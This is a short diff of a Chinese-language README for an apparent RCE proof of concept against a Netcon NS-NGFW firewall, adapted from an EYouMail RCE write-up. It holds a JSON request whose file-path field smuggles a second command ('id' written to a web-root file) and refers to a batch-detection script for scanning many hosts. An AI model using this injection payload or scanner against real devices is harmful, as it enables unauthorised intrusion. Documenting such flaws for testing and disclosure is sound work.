@@ -31,7 +31,7 @@ Accept-Encoding: gzip
     "data": [
         {
             "data": [
-                "/var/www/html/d.txt;id > /var/www/html/1.txt"
+                "/var/www/html/d.txt;id > /var/www/html/y.txt"
             ]
         }
     ], 
@@ -45,9 +45,9 @@ Accept-Encoding: gzip
 ![image](./pic/1.png)
 
 # 0x05 批量脚本
-EYouMailRCE-Batch-Detect.py，具体用法见：python3 EYouMailRCE-Batch-Detect.py -h  
+网康NS-NGFW-RCE-Batch-Detect.py，具体用法见：python3 网康NS-NGFW-RCE-Batch-Detect.py -h  
 效果如下  
-![image](./pic/1.png)
+![image](./pic/2.png)
 
 # 0x06 参考链接
 https://mp.weixin.qq.com/s/QqlueerhP0uVWWJNULhGvw
